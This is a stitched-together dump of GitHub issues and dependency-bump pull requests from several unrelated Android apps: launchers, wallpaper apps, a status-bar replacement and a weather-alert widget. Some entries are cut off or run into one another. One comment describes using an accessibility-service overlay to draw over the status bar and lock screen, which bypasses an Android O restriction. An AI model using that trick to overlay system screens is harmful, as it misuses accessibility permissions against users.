Title: chore: Bump org.robolectric:robolectric from 4.9.2 to 4.10.2
Body:
Bumps [org.robolectric:robolectric](https://github.com/robolectric/robolectric) from 4.9.2 to 4.10.2.
Release notes

Sourced from org.robolectric:robolectric's releases.

Robolectric 4.10.1 is a minor release that fixes several issues:

  • Fixes issue robolectric/robolectric#8163, which involve ICU extensions in SQLite (9551b04602985795ef7667a3f6238e989bdba765)
  • Fixes issue robolectric/robolectric#8137, ShadowVibrator APIs on older SDK levels (5127cefaddbb58c3e64423ee13cf4031ce531ec3), thanks @​utzcoz
  • Fixes issue robolectric/robolectric#8160, where an obscure exception would be thrown in resetters (866dacc37308c4b5381d7f01d5c56193f643b412).

Full Changelog: https://github.com/robolectric/robolectric/compare/robolectric-4.10...robolectric-4.10.1

Robolectric 4.10 adds support for native Android graphics. It is currently disabled by default and can be enabled using @GraphicsMode(NATIVE). When native graphics is enabled, interactions with Android graphics classes use real native Android graphics code and are much higher fidelity.

Behavior changes

In Robolectric 4.10, ReflectionHelpers.setStaticField no longer removes the final keyword from static fields. This is because removing final using reflection stops working in JDK 18 due to https://openjdk.java.net/jeps/416. To remove final from static fields, consider using some instrumentation-based approach, such as mockito-inline.

What's Changed

  • Remove dead code that uses Plan based instrumentation (ClassHandler.Plan) robolectric/robolectric#7610
  • Run SDK 33 tests on CI by @​utzcoz in robolectric/robolectric#7613

  • Bump ASM to 9.3 by @​utzcoz in robolectric/robolectric#7626
  • Add the ability to deploy specific preinstrumented jars to maven by @​hoisie in robolectric/robolectric#7602
  • Combine exceptions for ReflectionHelpers#getDeclaredField by @​utzcoz in robolectric/robolectric#7634
  • Clean up ShadowAccountManager by @​utzcoz in robolectric/robolectric#7636

  • Add alternative to Unsafe.defineAnonymousClass by @​utzcoz in robolectric/robolectric#7633
  • Support all authentication results for BiometricManager by @​charlesng in robolectric/robolectric#7427
  • Bump bcprov-jdk15on from 1.68 to 1.70 by @​dependabot in robolectric/robolectric#7638
  • Bump constraintlayout from 2.1.3 to 2.1.4 by @​dependabot in robolectric/robolectric#7640

  • Bump apiCompatVersion from 4.8.2 to 4.9 by @​dependabot in robolectric/robolectric#7672
  • Add call to $$robo$init for Jacoco-instrumented constructors robolectric/robolectric#7677

Title: feat: Allow GIF to play only once
Body:
Adds a setting that changes the default LoopCount.Infinite for a fixed one time playback.

Allows to use a GIF that doesn't loop correctly or is made to stop after one loop.
Can also save battery life since the screen stops redrawing when the GIF stops moving.

Title: chore: Bump h2 from 0.3.15 to 0.3.17
Body:
Bumps [h2](https://github.com/hyperium/h2) from 0.3.15 to 0.3.17.
Release notes

Sourced from h2's releases.

v0.3.17

What's Changed

  • Add Error::is_library() method to check if the originated inside h2.
  • Add max_pending_accept_reset_streams(usize) option to client and server builders.
  • Fix theoretical memory growth when receiving too many HEADERS and then RST_STREAM frames faster than an application can accept them off the queue. (CVE-2023-26964)

v0.3.16

What's Changed

  • Set Protocol extension on requests when received Extended CONNECT requests.
  • Remove B: Unpin + 'static bound requiremented of bufs
  • Fix releasing of frames when stream is finished, reducing memory usage.
  • Fix panic when trying to send data and connection window is available, but stream window is not.
  • Fix spurious wakeups when stream capacity is not available.

New Contributors

2.3.0

See CHANGELOG.md.

Changelog

Sourced from io.coil-kt:coil-compose's changelog.

[2.3.0] - March 25, 2023

  • New: Introduce a new coil-test artifact, which includes FakeImageLoaderEngine. This class is useful for hardcoding image loader responses to ensure consistent and synchronous (from the main thread) responses in tests. See here for more info.
  • New: Add baseline profiles to coil-base (child module of coil) and coil-compose-base (child module of coil-compose).
    • This improves Coil's runtime performance and should offer better frame timings depending on how Coil is used in your app.
  • Fix: Fix parsing file:// URIs with encoded data. #1601
  • Fix: DiskCache now properly computes its maximum size if passed a directory that does not exist. #1620

Title: [Feature] Show up in Sharesheet
Body: App should show in share menus, so as to set a wallpaper from an app without the need for downloading the gif.

Title: Expand the color palette
Body:
Hello.

It would be great if you could expand the palette of background colors, or allow a custom color to be set.

Title: [Feature] Horizontal/vertical lock
Body:
Could you perhaps implement the additional option to centre the GIF on just one axis? The double tap works great to centre both horizontal and vertical, but with larger GIFs I often find myself wanting to focus on a particular area while wanting to keep one axis precisely centred.

Perhaps a menu option, triple tap, or two finger tap. Just an idea, but I realise you would like to keep the app nice and simple, so I'm not sure how you'd  like to implement it.

Thanks for an awesome, beautiful app!

Title: [Feature] Better support for rotation
Body: Currently, when my device is rotated, the gif is either stretched and compressed if it is fullscreen, or if zoomed in it is moved off center. It would be great to have an option to disable rotation, or to specify different gifs/options for a rotated screen.

Title: [Android 14] Changing the clock face freezes live wallpaper unless app storage+cache is reset
Body:
**Describe the bug**
Android 14 has added an option to change the clockfaces for the lock screen in the wallpaper app (I'm on a Pixel 8). If I change the clock face, the wallpaper freezes and becomes a still image. This issue persists even if I reapply the wallpaper and restart the phone.

The only way to fix the issue is by clearing the cache and storage in Settings.

**To Reproduce**
Steps to reproduce the behavior:
1. Open the default wallpaper app
2. Change the clockface
3. The wallpaper is now frozen

**Expected behavior**
The wallpaper should continue to animate even after a clockface change.

**Usage information (please complete the following):**
 - Device: Pixel 8
 - OS: Android 14
 - Version 5.6.1


Thank you for this amazing app! The animated icons for each setting are a nice touch :)

Title: Swipe not detected
Body:
Swipe effect does not work on my device.

I have tried changing the sensitivity, turned off the respect battery saver. All other effects are working perfectly fine.

 - Device: Redmi Note 11T 5G
 - OS: MIUI 
 - Version Global 14.0.2

Title: more content and improvement
Body:
Hey dude I'm really in love with this whole app , I've been using it for a couple months now , but I really wish it got enhanced with more content.

or the ability when I set the wallpapers to change after midnight, the selection would also include all the different colors for wallpapers that can support different color combos..

that's it , overall as I said it's a great project and the only one (that I found) which is this completed overall.

I really wish u didn't abounded this project.

thanks for ur time and take care

*sorry for any mistakes English isn't my native language*

Title: Recent apps
Body:
- Hello! Before I tell you about the bug, I just wanted to say that I've been using this app for quite a while now (a couple of months to be exact). And I thought that sometime within those months that I've been using this live wallpaper app (that's one of the best if not the best), it would've been reported or fixed. Since I see no reports of this behavior in GitHub or in the Google Play Store, I decided to report it myself. (Though I'm pretty new to this so bare with me. Thanks!)

**Bug description:**
- The wallpaper on the recent apps menu bugs out and resets to the default Pixel 6 Material You Live Wallpaper instead of having the same appearance to the set live wallpaper (see screenshots below). The wallpaper in the recent apps menu only works correctly after I restart my device and the bug reoccurs after a couple of phone unlocks. Note that this behavior occurs when using a launcher. I primarily use this app on Nova Launcher Prime, and experimented on using it on Niagara Launcher and the same bug still occurs. I updated to Android 13, but this bug also happens on Android 12.


**Expected behavior**
- Uniform wallpaper in the recent apps background.

**Screenshots**
![Current Behavior](https://github.com/patzly/doodle-android/assets/87543555/c4dc4d9a-a45b-47dd-9065-3b2a888532de)

![Expected Behavior](https://github.com/patzly/doodle-android/assets/87543555/cbb60c5b-cbaf-4d94-9bd0-780da18f00f6)

**Usage information (please complete the following):**
 - Device: [Vivo Y21T]
 - OS: [Android 13]
 - Version [5.6.1]

Title: Wallpaper parts jump around
Body: I'm using doodle on my Pixel 6 with Android 14 beta. Sadly, when the tilt effect is enabled, parts of the wallpaper will start jumping randomly every few seconds and change their size.

Title: Option for static lockscreen wallpaper
Body:
hello, i love Doodle app, it's legitimately mind-blowing to use it with Lawnchair 12 and the theming they do together, i was wondering if the app could be able to apply Doodle features onto lockscreen or at least have a frozen image version of the wallpapers on lockscreens.

again great app and extremely beautiful.

Title: Replace 'Jost' with 'Tilda Sans' font
Body:
Jost* Book → Tilda Sans Medium
Jost* Medium → Tilda Sans Bold

1. Larger glyph coverage (535 → 684 glyphs)
2. Better realization (especially with non-Latin letters)

Title: Different colors for each line?
Body:
Hello! 
Thank you for this app! It is great! I really appreciate that it is FOSS / on f-droid! 

I'm visually impaired. Therefore I need large text and a color contrast that is not too low or too high and your app already fits these needs. In addition it has the touch action to open the system clock from the widget - in contrast to other apps I tried and used before. 
Can you add the option to set a different color for every line? That would make it easier for some visually impaired people and other people with difficulties in orientating on screen. 
Kind regards!

Title: Add option to show the time of the next alarm in the widget
Body:
First of all, thanks so much for this project! It's exactly what I was looking for and I greatly appreciate it being FOSS and on F-Droid :)

Would it be possible to add an option to show the time of the next alarm in the widget? I don't have any experience with Android development, but this appears to be how to get that info from the OS:

https://developer.android.com/reference/android/app/AlarmManager.html#getNextAlarmClock()

I've attached a simple mock showing what I mean, in case it's unclear. Thanks for considering this request!

Title: APKs using deprecated MD5 signature
Body:
Just a note: your APKs are still signed using MD5, which is deprecated.

    ERROR: JAR signer PELYA.RSA: Failed to verify JAR signature META-INF/PELYA.RSA against META-INF/PELYA.SF: java.security.SignatureException: Algorithm constraints check failed on disabled algorithm: MD5.

As you know, deprecated soon might mean unsupported – so you might wish to act on this :wink:

If there is only horizontal lines, it works fine. 

My guess is that it has something to do with either subpixels or that it is an LCD?

Title: Should disable itself for certain apps.
Body: Some apps (most notably the system UI) will refuse to take certain actions if a screen overlay is active. Pixel Filter should be able to disable itself for such apps (preferably with a built in list of standard ones like System UI plus a user-configurable additional list).

Title: Screen locks up, registers rapid ghost touches on non-AMOLED devices
Body:
I didn't realise my phone's screen wasn't AMOLED when I downloaded and ran the app. When I did, my screen seized up and started rapidly registering touches all over the screen.  

Based on other reviews about this on the Play store, including one from yours truly, non-AMOLED devices don't like being treated as AMOLED devices.  

I know it should come down to reading the store description better, but a warning dialog in the app to save people from having their pants scared off by a possessed phone would be a nice addition.

ComponentInfo for EN and JP apps (also added to the `appfilter.xml`):

EN: `com.aniplex.fategrandorder.en/jp.delightworks.Fgo.player.AndroidPlugin`

[preview of icon](https://user-images.githubusercontent.com/71507375/192871177-039d7e7b-97a0-4d18-86f9-de416485dbc5.png)
[reference image](https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fclipground.com%2Fimages%2Ffate-grand-order-logo-9.jpg&f=1&nofb=1&ipt=caa89c5de44be3c62d026cd3cb0ce299c8539e1c7a942b8b3b87857073b6c4d4&ipo=images)

Here is the unscrubbed original file in case you need to make minor edits:
[fategrandorder-unscrubbed.svg](https://user-images.githubusercontent.com/71507375/192842322-f948c1de-a596-4884-a72c-a4414a3f8eae.svg)

note that while designing the icon, I based it off the actual logo for the game, and so the thickness of the lines is not the suggested 1px, but a more true to the actual logo thickness. (I tried it with 1px and/or rounded lines and it looked very wrong).

Also, if there were build instructions for this, that would be great because I cannot figure out intuitively how to incorporate any new icons.

Title: Sometimes Droid and rainbow are not located in the center
Body: ## Steps to reproduce for Samsung devices: 1. Go to "Wallpapers", "My wallpapers" then "Live Wallpapers". 2. Tap on the "Nyan" and choose it as the source of live wallpapers on Home screen. 3. Just use your phone as always, because issue appears rarely. ### Expected behaviour: Droid and its rainbow located in the center of screen when used as the live wallpaper. ### Real behaviour: Droid and its rainbow shifted off to the upper right corner of the live wallpaper. *The problem persists when coming back again to affected screen orientation (where it occured), but in this case does not appear in other screen orientations.* ### Samsung Galaxy A20s, Android 11, Nyan 2.0.4

Title: App drawer randomly jumps to the top
Body:
## Description
Sometimes when I freshly open the launcher (e.g. after unlocking the phone) and try to scroll down the app drawer it behaves the following way: At first it follows my gesture and scrolls down, then it suddenly jumps back to the top again and continues the scrolling movement there. (Un)fortunately, this bug is very inconsistent and seems to apear only every now and then. Sometimes it even happens randomly while I am using the launcher. So far I couldn't spot a pattern. 

##  Eventual steps to reproduce the issue
- Lock the smartphone
- Unlock the phone and open the Posidon Launcher
- Open the App drawer
- Scroll down

## Technical details
- **Android-Version:** 9
- **Phone:** Samsung Galaxy S8


- [x] I have the newest version of the Posidon Launcher (2022.0.0)

Title: The Creat Cleanup
Body:
Posidon launcher is currently unmaintainable, the code is a mess, for the project to survive, we have to massively reorganise the code, and possible trim some customization features.

This is a thread to discuss exactly that.
Which features we can let go, how to reuse the same code for different parts of the launcher...

Title: [Feature Request] Set the app drawer beside the feed rather than under it
Body:
### Current State
Since the dawn of android and the app drawer was always under the main screen of the launcher and is usually dragged up to be opened.

### The Proposal
Allow users to select the option to show the app drawer on the side of the feed, in emulation to Windows Phone UI, while maintaining the dock and search (if chosen to be shown) with the same look and behaviour.

### The Rationale
Dealing with multiple areas having the same scroll direction (navigating the feed vertically, opening and closing the app drawer with vertical scroll) is something that always confused me about when I use apps with such behaviour, now that I'm using Posidon which allows me to keep up with my RSS subscriptions right from my main screen, I'm getting similar confusion*. I remember using few launchers that imitated Windows Phone UI with the left side having tiles area that is vertically scrollable, and the app drawer being on the right, and I definitely enjoyed those launchers at some point.

\* to be fair, this is a personal matter and not at all a bug or a bad design by Posidon.

Title: Adding browser shortcuts (or indeed any shortcut) to home screen doesn't work
Body: Attempting to add a website shortcut through firefox or adding shortcuts to the home screen through other apps doesn't work and is met with 'Not enough space.' even when there is space or the launcher is empty.

Title: Columns instead of staggered mode
Body: I suggest letting the user choose the number of columns instead of a toggle for 1 or 2 columns. This can be particularly useful for landscape and possibly tablets.

Title: Headline slicing
Body: Make it possible to hide the last x characters from the headline for every article for a specific feed. For example, CNET adds the string " - CNET" to every headline. It would be nice to be able to remove the last characters in order to get a clean headline.

Title: Font size
Body: Make it possible to change the font size. This is in particular useful for people who hide the images and only show the headlines.

Title: Seperate text location
Body: Make it possible to move the text to the top of the image instead of below the image.

Title: Card height not working
Body:
Changing the card height under the news section does nothing.

UPDATE: It does work. I had wrap content enabled. For future reference, place the options "wrap content" and "height" above each other. If wrap content is enabled, the "height" option should be grey and not changable.

Title: Landscape mode redesign
Body: The current landscape mode is simply the portrait mode but rotated, For starters, I recommend that the dock should remain on the same place.

Title: More simple interface
Body:
Bonjour,
J'ai vu ton produit qui est super, et très proche, je pense, de ce que je recherche...
Mais j'aimerais avoir un interface encore plus épurée
- Se limitant au sous menu "contacts"
- Avec un contenu pré-défini (par exemple défini par un .xml contenant 5 contacts) ou protégé (pour éviter que l'utilisateur final puisse corrompre le contenu)
- Affichage des contacts avec une police et icone (photo) encore plus grande (adaptée pour une déficience visuelle importante)
Pourrais-tu me guider (par des conseils) pour faire ces adaptations?
Merci,
Serge

Title: Option to Hide Applications in the Listing
Body:
As a frequent user of the app, I've been thinking about a feature that I think would be very beneficial to many of us. I would love to propose the integration of an option to hide applications in the main listing, with the ability to easily access them via the search engine.
The main reason behind this suggestion is to provide users with greater control over their privacy. By being able to hide applications directly from the main listing, users are given the ability to customize their experience and safeguard the visibility of certain applications.
It is essential to note that including this functionality will strengthen users' trust in the application, as many value discretion and control over their personal information.

Title: Allow choosing phone app
Body:
I use opencontacts (which is a privacy conscious contacts app with non-default contacts storage), and koler as a dialer (phone app). 
Phone icon opens koler, however there are no contacts in there. I prefer to use opencontacts to call / message, as default phone and sms apps can't access my contacts.

I would like to have choice regarding which app is opened when clicking phone icon.

Body: My android is missing some components to open the add app option in the options, I hope someone can share the format or example of settings.xml, thanks!

why don't add some extra features just to delete some apps from the home screen like the shortcut to a to-do app or calendar, browser etc etc just by adding another pages by swiping Right or Left.

Title: [Feature Request] Ability to uninstall apps from the "Customise Apps" activity.
Body:
The fact that there is no way to uninstall apps from the launcher is becoming a little inconvenient for me. As a minimalist I would like my phone to be very less bloated and uninstalling apps should be the easiest thing to do in a minimalist launcher in my opinion. Because of this launcher I have reduced the usage of so many apps as they don't come in my view very easily and I would rather delete them from my phone. But I have many times postponed deleting apps because it gets very difficult doing that in this launcher. I can go once and for all in the settings and delete every unwanted app, but doing that every time I want to delete an app would get annoying very quickly. 
Ability to delete apps would be very helpful.

Title: [Feature Request] rounded corners of the dialogue boxes with blur glass look.
Body: The launcher looks very good aesthetically but the look is somewhat ruined by the dialogue boxes which appears to show options. Rounded corners and blur glass look would look very awesome and morden.

Title: [Feature Request] Ability to change the font.
Body: All the apps usually use Droid Sans as far as I know and Slim launcher is using some different font. It feels inconsistent while switching from the launcher to all the apps. I would like the ability to use Droid Sans as the launcher font.

Title: Sorting of apps should be case-insensitive

Title: There are overlapped texts on the app customizing page
Body: **Describe the bug** Dear developer! In the process of using, I found a bug in layout / display. As shown in the figure below, on the app customizing page, **after adding 7 apps on this fragment, some texts would overlap**. This may be an adaptation problem. I suspect it is because **display and font size** are set to large **(mainly due to display size)**. Because of some problems with my eyesight, I often use the largest font and display. ![103165857-dbaf8580-4857-11eb-9e22-120ae1901389](https://user-images.githubusercontent.com/25502419/128597553-7949a1a3-0b21-4ddf-9357-766b5c302518.png) App version is 2.4.20, my mobile phone is Google Pixel 2, and the screen resolution setting is 1920* 1080. And **_my font size and display size are the largest ! ! !_** Also, my Android system version is 10.0. The above is a description of the problem. The overall experience of the software is good. You can see that the design is very attentive. Thank you very much for the efforts of the developers all the time. I hope to receive a reply. Thank you so much!! **Expected behavior** I hope that the texts on the app customizing page are separated from each other instead of overlapping. **Steps to reproduce the behavior:** 1. use the largest font and display in the display setting 2. open slim-launcher 3. scroll up and click the "options" button 4. click the "Customise Apps" 5. click the "Add" button, and select an app. Keep doing this until the add button disappeared 6. this error could be seen **Screenshot** (The overlap is marked in red) **Environment** 1. Title: UI translation
Body:
Thank you for this great open source launcher.
I think a really useful feature would be to allow us to translate the UI without having to upload any translation files.
This could be done with a mechanism similar to the one used to rename apps on the home screen. It could be added as an "experimental" option inside the "options" menu, and allow users to set their custom strings for: "options", every option inside that menu and even a custom suffix for the 12-h time format would be useful.

Thank you for your time and consideration.

Title: Possible support for Android O
Body: Maybe this is not an issue, but, as a developer, I can suggest you a very simple workaround for the problem that Android O doesn't allow to create overlays on top of the status bar. Really, that's not true, even if the Android Developers website says it is. Indeed, I'm not sure whether it is a bug or an expected but undocumented (as far as I was able to find out on the Internet) behavior. However, if you create an `AccessibilityService` (no flags needed) and then you create an overlay with the usual `WindowManager`, with `TYPE_ACCESSIBILITY_OVERLAY`, with the proper flags in the `WindowManager.LayoutParams` from within the `onServiceConnected` method, you should be able to draw on top of the status bar. I'm actually doing it. And it is on top of the lock screen as well. And also on top of the ambient display! It looks like you have superpowers when using `TYPE_ACCESSIBILITY_OVERLAY` as a type for the overlay being created. It would be enough for you to use this type of overlay and eventually add an accessibility service to your app (I used it a long time ago and I don't remember whether it already uses an accessibility service or not) and maybe change some overlay flags. It's extremely easy. I'm actually developing an app to replace the system quick settings, which works just this way.

  at android.view.WindowManagerImpl.addView (WindowManagerImpl.java:85)
  at com.james.status.services.StatusServiceImpl.setUp (StatusServiceImpl.java:257)
  at com.james.status.services.StatusServiceImpl.onCreate (StatusServiceImpl.java:91)
  at com.james.status.services.StatusServiceCompat.onCreate (StatusServiceCompat.java:25)
  at android.app.ActivityThread.handleCreateService (ActivityThread.java:3071)
```

I could just wrap it in a try/catch block, but without knowing what's actually going on that would be messy. Only one user in the beta test (~150 people) appears to have reported it, so it could easily be device-specific, but it appears that the service is somehow starting without the required permissions to draw overlay views. This should not be possible; regardless of what the user throws at it, Status should never reach this line if the overlay permission hasn't been granted. Agh.

Title: Rounded status bar icons
Body: It would be great if there will be option to have the icons rounded in its sides (which can be seen in Oreo 8.1 and Pie)

Title: Multiple App/Activity Fullscreen "Modes"
Body:
Pressing the "fullscreen" button will open a dialog with two switches - one to enable/disable the regular fullscreen (has the same effect as the original switch) and one to "Ignore Fullscreen Auto-Detection", which ignores whatever result Status gets from the fullscreen detection view while the activity is displayed.

- [x] settings ui
- [x] actual functionality
- [ ] global auto-detection switch

Title: Re-Implement Features
Body:
As a result of #135 and #113, several features, including heads-up notifications, have been removed to simplify the app and allow me to change a few things. I don't think the heads-up functionality was actually that great to begin with, but I have no way of knowing how many people were actually using it. It should (probably) be fixed before a release. I think.

- [ ] Heads-Up Notifications
- [ ] Bump Mode
- [ ] Tinted/Inverted Icon Colors

Title: Display Backup File Location
Body:
Generally make it easier to share the config file between devices. A "backup to Google drive" button could also be an option.

- [ ] Display File Location
- [ ] Backup to Google Drive
- [ ] Import File Button

Title: Join NetworkIconData and DataIconData
Body:
They use the same listeners, so this is not a difficult change, but #132 will need to be completed first for this to actually be of any use.

- [x] fix #132 
- [ ] do the thing

Title: Integration with Material Notification Shade
Body: I will not be making a notification shade along with this app as it would take too much of my time, and MNS already does this better than I will be able to. A link to [the app](https://play.google.com/store/apps/details?id=com.treydev.mns) in the settings menu should reduce requests for this feature, and I will be adding the notification shade activity to the presets mentioned in #130.

Title: Preset App-Specific Settings for Popular Apps
Body: To slightly increase accuracy and usability upon first setup, I will be making a **small** list of preset color/fullscreen settings for apps that Status is unable to detect by itself. However, I will not add many items to this list, and most requests to add apps to this list will be denied unless they are in the form of a PR.

Title: Ability to change nav bar color
Body: Requested feature. No clue how to make it work, but I've seen a few other apps do similar things so it shouldn't be too difficult to figure out. Biggest issue is implementation.

Title: Finer Grained Notification Controls
Body:
Add options to discern between different types of notifications - maybe somehow keeping track of the ids (and titles as well, so the user can actually tell what they mean) and adding the ability to block certain numbers.

On second thought, keeping track of the notifications might not be such a great idea. However, I could at least allow the user to block persistent notifications (one option on the icon settings to block ALL persistent notifications, and one on the app settings to block them from individual apps).

- [x] fix #146
- [ ] icon settings ui
- [ ] implementation in the notification icon

Title: (Unknown Issue) Status not Starting Properly After Clean Install
Body: I have no idea what could possibly be causing this, but as there have been three separate reports of this issue I am now acknowledging its existence as something that isn't device-specific. I originally thought the problem came from the accessibility service as that has been a point of many headaches in the past, but as it persists after reinstallation I am now thinking it might be something to do with the devices backing up & restoring SharedPreferences after installation. Maybe it's creating some scenario that shouldn't exist and I haven't accounted for somewhere despite having gone through the setup routine countless times in the past to ensure its perfection. Anyway, I'll try declaring the option to disable backups in the manifest of the next release and see if it makes any difference.

Title: Status bar disappears when I use the drop-down menu
Body:
The status bar works fine in every app o tried and on home screen, but when I pull down the drop menu, the status bar disappears and will appear again if I enter in some menu or open an app.

---

The status bar shouldn't disappear if I use the drop-down menu.

---

**Affected device**: Asus Zenfone 3

**App Version**: 3.7 (according to Play Store)

**Android Version**: 7.0

Title: Option to Disable Notification Color Masking
Body: Apparently notifications still exist that aren't a solid color. One detriment of adding this option is that users will only be able to turn off masking for all notifications or none at all, there's no (efficient) way for Status to decide whether to mask the icons on its own. Meh.

Title: Update Service on settings changes without restarting it
Body:
This would prevent crashes and have huge performance benefits. Should've done this to begin with.

- [x] icon settings
- [x] resource-based colors
- [x] default color
- [x] home screen transparency
- [x] default icon/text colors
- [x] contrasting icon/text colors
- [ ] prevent overlaps
- [ ] animation settings
- [x] transparent mode
- [x] side padding
- [x] burn-in protection

Title: Multi-Line Time Formats
Body: Yep.

Title: Support for Substratum/rooted devices
Body:
Would it be possible to develop another version of Status for rooted devices and/Substratum?

Covering Substratum may solve the Sdk26 problem due to a likely native Support on AOSP in Sdk26. 

Or for Sdk 25 a normal rooted edition to get rid of the need for the always-active Notification.

Title: Seconds in the Clock
Body: While not entirely necessary, the ability to be able to add seconds to the clock would be a nice addition if possible.

Title: GPS Icon Doesn't Disappear
Body: I'm not exactly sure what's causing this issue (it works fine for me on every device I've tried), but a few users have reported that the GPS icon doesn't disappear when GPS is turned off in the settings. There are a few reasonable explanations for this besides "Status is broken", but it's worth checking out anyway.

Title: Support for Android O
Body: Currently, Android O doesn't allow overlays to display on top of the status bar, regardless of the target SDK. It doesn't seem like the Android devs are planning on changing this anytime soon. If I can find a workaround, I will implement it. Otherwise, it would be more productive to work on a rooted version of Status for users on Android O. The only problem here is efficiency - Status as a concept only makes sense if you consider that it is meant to work without root access :P

Title: WiFi/Network Speed
Body: Adding an option for this in the WiFi icon could be useful. Not sure how to actually obtain the values, I'll look for something on SO a bit later.

Title: Bluetooth icon doesn't update
Body: Using unlocked Moto Z. No root. Android version 6.0.1. Bluetooth icon doesn't update when connected or disconnected from a device.

Title: Heads-up notifications dismiss keyboard
Body: Yep.

Title: Data and signal icons are shown incorrectly
Body: They usually (I've had a few occurrences where they do actually work properly) refuse to disappear when airplane mode is enabled or when wifi is turned off. No clue why.

Title: Needs support for dual sim phones
Body: I've created an IconData class for it [here](https://github.com/TheAndroidMaster/Status/blob/master/app/src/main/java/com/james/status/data/icon/DualNetworkIconData.java), but it doesn't seem to be working properly.

Title: Notifications don't dismiss properly below android 4.3
Body: Notification listener api isn't available, listens for notifications through the AccessibilityService but cannot detect when they are dismissed - temporary solution: remove all icons when the notification panel is opened.

Title: Last parts of texts are blocked on the license page
Body: **Describe the bug** Dear developer! In the process of using, I found a bug in layout / display. As shown in the figure below, on the license page, **two parts of texts could not be seen fully**. This may be an adaptation problem. I suspect it is because **display and font size** are set to large **(mainly due to display size)**. Because of some problems with my eyesight, I often use the largest font and display. ![103165857-dbaf8580-4857-11eb-9e22-120ae1901389](https://user-images.githubusercontent.com/25502419/128597553-7949a1a3-0b21-4ddf-9357-766b5c302518.png) App version is 2.1.2, my mobile phone is Google Pixel 2, and the screen resolution setting is 1920* 1080. And **_my font size and display size are the largest ! ! !_** Also, my Android system version is 10.0. The above is a description of the problem. The overall experience of the software is good. You can see that the design is very attentive. Thank you very much for the efforts of the developers all the time. I hope to receive a reply. Thank you so much!! **Expected behavior** I hope that I can see all of the texts on the license page, but in this circumstance, part of them seems to be blocked. **Steps to reproduce the behavior:** 1.use the largest font and display in the display setting 2.open this app and click the license button on the main page 3.this error could be seen **Screenshot** **Environment** 1. Version of Frost: 2.1.2 2. Device : Google Pixel 2, 3. OS version : Android 10.0

Title: Add a refresh button on the widget in v1.x branch
Body: The unreliable nature of the background refresh on 1.x (see #29) can probably be somewhat mitigated by putting a refresh button on the widget which does a blocking foreground refresh. This can probably be done faster than the 2.x rewrite (which is pushing a year overdue now).

Title: Android 4.2.1 doesn't support new enough SSL for NWS's webserver
Body:
The built-in SSL libraries in Android 4.2.1 (which is our second-lowest supported OS version) will not connect to the NWS webserver - server rejects the connection for unsupported SSL versions.

According to the Play Store, there are 3 devices using this app that are on this version of Android or older (and one of those 3 is one of my devices).

So we're either going to need to stop supporting devices this old, or find a way to statically link a more modern SSL library in the app.

<details>

```

error:14077410:SSL routines:SSL23_GET_SERVER_HELLO:sslv3 alert handshake failure (external/openssl/ssl/s23_clnt.c:741 0x41446c38:0x00000000)

Title: Handle re-configuring a widget
Body: It's possible to drag the widget from the home screen onto a drop area that tells it to reconfigure the widget.  If the configuration dialog gets called on a widget that already exists, we need to load its existing config and populate the dialog appropriately instead of setting it to defaults like it does now. (this will depend on having it save the configuration in the first place of course)

Title: Widget config dialog should have an animated spinner in the County field while waiting for it to load
Body: When you change the State dropdown it fetches the list of counties for the state you picked from the NWS API, which may take a few seconds (or several seconds if you're on a slow network).  Right now it drops the word "Loading..." in there, but that's not always obvious that you need to wait.  Should see if we can get an animated spinner in there instead.

Title: Need to upgrade configuration from 1.x
Body: On first launch we need to check if the old configuration options from 1.x are set, and whether any widgets exist, and if so, then the 2.x style configuration for each of the existing widgets needs to be set to match the old 1.x config and the 1.x config should be deleted. Doing this in widget startup might actually be a good place to do it.

Title: Need a Privacy Policy
Body:
The app needs a privacy policy both embedded/viewable in the app and on the web that can be linked from the Play Store.

This will be a hard requirement once #20 is implemented, since we're going to have to request permission from the user to get their location and they'll want to know why we're asking for it.

Title: Implement background task to fetch alerts on a schedule
Body:
This is the elephant in the room.  In version 1.x this was implemented as a background service, which Google has now banned.  This needs to be implemented as an alarm timer now. Keep in mind it'll need to run at an exact time (with that time calculated) because it still needs to stay up to date whether or not the user is watching it.

Documentation here: https://developer.android.com/guide/background/

Note also that we need to remain backward-compatible to API 16 because people tend to use burner tablets to run this on, and there's a number of people still running it on that according to the Play Console, which means we probably need to use one of the compatibility libraries for event scheduling.

Title: Implement Widget Configuration screen
Body:
This is already stubbed in, it needs to actually do something.

Need to find a persistent way to store the configuration (the Preferences API used in version 1.x is deprecated so we can't use that).  The available states and counties should be fetched from the NWS REST API.

Title: Allow configurable filters for which alerts to care about
Body:
Suggested by an anonymous reviewer in the Play Store:
Allow to filter the alerts.
Example use case: I live in a county with a lakeshore that frequently has high surf and flood warnings.  I live too far uphill to care about those, so would be great to be able to exclude those specific alerts from the list.

Title: Show the alert area on a map
Body:
Most of the alerts contain GPS coordinates of the bounding polygon for the alert.  When these are available, they should be shown on a map with the alert when viewing the alert details.  This would especially be helpful for tornado warnings, for example, which are typically for a small area, even though the alert is sent to the entire county. 

Docs for the Google Maps Android SDK at https://developers.google.com/maps/documentation/android-sdk/start

Title: Alerts should be stored in an SQLite database instead of in memory
Body: If you choose an entire state or the country, it's a big list of alerts at any given time.  Save memory by storing it in a database instead.  This also allows a lot of other features on the enhancement request list to be implemented easier (such as alert caching, and early dismissal of non-expired alerts)

Title: Allow viewing alert detail offline
Body: When in low/intermittent bandwidth situations, it's possible to download the index of current alerts and then be without Internet at the point when you are reading them.  The app should offer the option to proactively download and save the alert text as the alerts are downloaded, so the cached copy can be viewed.  This would also be a UI performance improvement, as the alert text would display immediately instead of having to watch for it to be fetched when you tap on the alert.

Title: Allow text in alert detail to be selected
Body: It would be nice to be able to copy text from alert details and paste it elsewhere or share it.

Body: requested by Ben Spears via Play Store review.

Body:
Suggested by Andrew Brown via a Play Store review.
Sounds like a good idea.

Title: Allow different widgets to retrieve data for different counties
Body: Right now you can have as many widgets as you want, but they all pull the data for the county you picked in the main app configuration.  Should make it possible for each widget to have its own data source so you can watch more than one county, for example.

Title: Provide matching icons and colors for additional alert types
Body:
Here's the official list of what's possible:
http://alerts.weather.gov/cap/product_list.txt
There's a lot of stuff in there that'll show up on the generic gray background with the NWS logo right now because it doesn't have specific icons or colors defined for them.
Right now these are all defined at https://github.com/justdave/nwsweatheralertswidget/blob/master/src/net/justdave/nwsweatheralertswidget/NWSAlertEntry.java#L202 (line number subject to change)

Title: Provide audible notifications when new events arrive
Body: What good are weather alerts if you can only see them?  Important stuff like watches and warnings should have an audible notification.  In the case of warnings it ought to be persistent/constant until it's acknowledged.

Title: Alert list should be sorted so warnings and watches are always listed first
